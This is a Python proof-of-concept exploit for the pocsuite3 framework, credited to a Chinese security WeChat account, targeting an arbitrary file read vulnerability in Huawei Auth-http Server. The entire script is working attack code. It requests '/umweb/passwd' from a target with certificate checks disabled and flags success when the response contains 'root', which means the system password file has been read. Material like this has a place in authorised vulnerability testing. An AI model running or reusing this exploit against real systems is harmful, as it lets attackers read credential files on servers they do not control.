# _*_ coding:utf-8 _*_
# @Time : 2023/11/27 20:21
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class enjoyIT1(POCBase):
    pocDesc = ''' 华为Auth-http Server任意文件读取漏洞 '''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-27'
    createDate = '2023-11-27'
    updateDate = '2023-11-27'
    name = '华为Auth-http Server任意文件读取漏洞 '
    appName = '华为Auth-http Server'



    def _verify(self):

        result = {}
        path = "/umweb/passwd"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        url = self.url + path
        payload = '/umweb/passwd'

        try:
            response = requests.get(url, headers=headers,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(enjoyIT1)
